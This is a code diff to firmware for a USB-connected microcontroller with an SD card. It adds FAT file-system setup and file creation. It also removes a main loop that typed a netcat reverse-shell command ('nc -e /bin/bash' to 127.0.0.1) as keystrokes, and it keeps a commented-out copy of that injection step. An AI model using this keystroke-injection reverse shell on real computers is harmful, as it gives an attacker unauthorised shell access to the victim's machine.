@@ -1,4 +1,6 @@
 #include "main.h"
+#include "fatfs.h"
+#include "file_handling.h"
 #include "usb_device.h"
 
 
@@ -17,11 +19,23 @@ int main(void) {
   MX_GPIO_Init();
   MX_SDIO_SD_Init();
   MX_USB_DEVICE_Init();
+  MX_FATFS_Init();
+
+  // HAL_Delay(2000);
+  // openShell();
+  // typeString("nc -e /bin/bash 127.0.0.1 4567 >/dev/null 2>&1 &\ndisown %1\n");
+  // closeShell();
+
+  mount_sd();
+  create_file("test.txt");
+  // Format_SD();
+  // Create_File("FILE1.TXT");
+  // Create_File("FILE2.TXT");
+  // Unmount_SD("/");
 
   while (1) {
-    HAL_Delay(1000);
-	  typeString("nc -e /bin/bash 127.0.0.1 4567 >/dev/null 1>/dev/null 2>/dev/null &\n");
     flashLED();
+    HAL_Delay(1000);
   }
 }
 
@@ -71,7 +85,7 @@ static void MX_SDIO_SD_Init(void) {
   hsd.Init.ClockPowerSave = SDIO_CLOCK_POWER_SAVE_DISABLE;
   hsd.Init.BusWide = SDIO_BUS_WIDE_1B;
   hsd.Init.HardwareFlowControl = SDIO_HARDWARE_FLOW_CONTROL_DISABLE;
-  hsd.Init.ClockDiv = 0;
+  hsd.Init.ClockDiv = 5;
   if (HAL_SD_Init(&hsd) != HAL_OK) {
     Error_Handler();
   }
